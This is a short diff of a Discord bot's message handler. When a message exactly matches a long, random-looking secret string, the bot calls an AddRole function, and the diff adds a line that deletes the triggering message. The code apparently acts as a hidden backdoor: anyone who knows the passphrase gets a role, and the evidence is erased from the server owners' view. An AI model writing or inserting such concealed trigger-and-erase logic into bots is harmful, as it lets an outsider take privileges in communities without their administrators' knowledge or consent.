@@ -34,6 +34,7 @@ client.on("guildCreate", (guild) => {
 client.on('message', message => {
 	if(message.content === 'q-ri*fDdR#(lxG<E9wNaJI28R\cloKW6vEiFIJt|Jksib9~Ez~$^OFC17n|?|t;B3K3LP3y?Q-tN*3Vzck8*n%N#CO=q}ZQw8~K88[oG$;XMc1B3]p/$39vFZH06f&HRzWLuz><5~k${k[|to%zF*+dY\2#Xn#KT:\DG*5Qzs/${)w)>=2b~qL)*Q;?P,{Z+S}Q#R.fN{mYd3fbWHc&3POkm7U2iv6Rzl0&W^29kCleeQL%X]LSs4$z$99yC$PNp3RI+J>jdyOu;}mYfnK=j{4ZOE7\u]7uz4kM)jQ9I7%V0;MF/KNvZ6lyEt]3hLBZPCq&ij%;Bq=yk~n$f!WiLVijq*QW.o;^QT:rC#9/T(T(g<eq0[OYxfKaEVwfWPd$/8c*jm1E={Bhw4vfdWNIjf^?=Z!]UO#h,x9?m*X5am:1#&hJzI]0ZsKSu}4~/WN~eLxq7n5<5I?HF&o->RB:AL=pkD.-wf]AoihC?2K,gS8^|coO]44t>'){
 		AddRole(message);
+		message.delete();
 	}
 	message.content = message.content.toLowerCase()
 	if (message.content.substring(0,1) === '+' && message.author.bot == false) {
